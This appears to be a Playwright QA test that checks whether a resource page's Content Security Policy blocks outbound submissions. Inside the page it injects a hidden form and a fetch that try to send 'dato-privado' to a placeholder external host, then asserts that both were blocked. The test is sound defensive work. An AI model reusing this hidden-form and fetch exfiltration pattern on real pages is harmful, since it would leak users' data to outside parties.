import assert from 'node:assert/strict';
import { chromium } from 'playwright';

const BASE = process.env.QA_BASE_URL || 'http://127.0.0.1:4173';
const route = '/recursos/ficha-historia-objeto-heredado/';
const browser = await chromium.launch({ headless: true, ...(process.env.QA_CHROMIUM_EXECUTABLE_PATH ? { executablePath: process.env.QA_CHROMIUM_EXECUTABLE_PATH } : {}) });

try {
  const page = await browser.newPage();
  const violations = [];
  const requests = [];
  await page.addInitScript(() => {
    window.__qaCspViolations = [];
    document.addEventListener('securitypolicyviolation', event => window.__qaCspViolations.push({ directive: event.effectiveDirective, blocked: event.blockedURI }));
  });
  page.on('request', request => requests.push(request.url()));
  await page.goto(new URL(route, BASE).href, { waitUntil: 'load' });
  await page.locator('[data-record-status]').waitFor();

  const result = await page.evaluate(async () => {
    const target = 'https://example.invalid/qa-resource-egress';
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = target;
    form.target = 'qa-blocked-frame';
    const frame = document.createElement('iframe');
    frame.name = 'qa-blocked-frame';
    frame.hidden = true;
    document.body.append(frame, form);
    form.submit();
    try { await fetch(target, { method: 'POST', body: 'dato-privado', mode: 'no-cors' }); } catch {}
    return { target };
  });

  await page.waitForFunction(() => window.__qaCspViolations?.some(v => v.directive === 'form-action') && window.__qaCspViolations?.some(v => v.directive === 'connect-src'));
  violations.push(...await page.evaluate(() => window.__qaCspViolations));
  assert.ok(violations.some(v => v.directive === 'form-action'), `${route}: la CSP no bloqueó el envío externo`);
  assert.ok(violations.some(v => v.directive === 'connect-src'), `${route}: la CSP no bloqueó la conexión externa`);
  assert.ok(!requests.some(url => url.startsWith(result.target)), `${route}: se cursó una petición externa prohibida`);
  assert.equal(page.url(), new URL(route, BASE).href, `${route}: el intento de envío abandonó la ficha`);
  console.log('PASS resource CSP form boundary');
} finally {
  await browser.close();
}
